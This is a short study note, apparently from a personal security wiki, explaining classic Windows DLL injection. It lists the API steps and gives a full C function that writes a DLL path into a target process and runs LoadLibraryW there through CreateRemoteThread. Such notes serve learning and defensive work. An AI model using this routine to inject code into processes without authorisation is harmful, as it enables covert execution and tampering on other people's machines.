---
tags:
  - security
aliases:
  - DLL Injection
---
The process of inserting a [[Dynamic Linked Library|DLL]] into a running program through [[LoadLibrary()]]. Uses similar pattern to [[Remote Process Injection]]
# Classic Pattern
- [[VirtualAllocEx]]
- [[WriteProcessMemory]]
- [[CreateRemoteThread]]
# DLL Injection Code
1. [[VirtualAllocEx]] to allocate memory to hold the DLL path (UTF-16) long string
2. [[WriteProcessMemory]] to write the DLL path name
3. Inside [[CreateRemoteThread]]:
	1. `lpStartAddress` is [[LoadLibrary()|LoadLibraryW()]] to load the DLL
	2. `lpParameter` is the DLL path name buffer
4. Triggers [[DLLMain]]

```c
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR szDllName) 
{

	BOOL		bResults				= FALSE;
	LPVOID		pDllPathBuffer			= NULL;
	DWORD		dwDllPathSize			= lstrlenW(szDllName) * sizeof(WCHAR);
	SIZE_T		lpNumberOfBytesWritten	= 0x00;
	HANDLE		hThread					= NULL;

	// Allocating memory in hProcess of size dwDllPathSize and memory permissions set to read and write
	pDllPathBuffer = VirtualAllocEx(hProcess, NULL, dwDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pDllPathBuffer == NULL) {
		printf("[!] VirtualAllocEx Failed With Error: %ld \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[i] pDllPathBuffer Allocated At: 0x%p Of Size: %d\n", pDllPathBuffer, dwDllPathSize);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	// Writing szDllName to the allocated memory pDllPathBuffer
	if (!WriteProcessMemory(hProcess, pDllPathBuffer, szDllName, dwDllPathSize, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwDllPathSize){
		printf("[!] WriteProcessMemory Failed With Error: %ld \n", GetLastError());
		printf("[i] Wrote %lu of %lu Bytes\n", (DWORD)lpNumberOfBytesWritten, dwDllPathSize);
		goto _END_OF_FUNC;
	}

	printf("[i] Successfully Written %ld Bytes\n", (INT)lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	// Running LoadLibraryW in a new thread, passing pDllPathBuffer as a parameter which contains the DLL name
	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, LoadLibraryW, pDllPathBuffer, NULL, NULL);
	if (hThread == NULL) 
	{
		printf("[!] CreateRemoteThread Failed With Error: %ld \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[+] DONE !\n");
	
	bResults = TRUE;

_END_OF_FUNC:
	if (hThread)
		CloseHandle(hThread);
	return bResults;
}
```
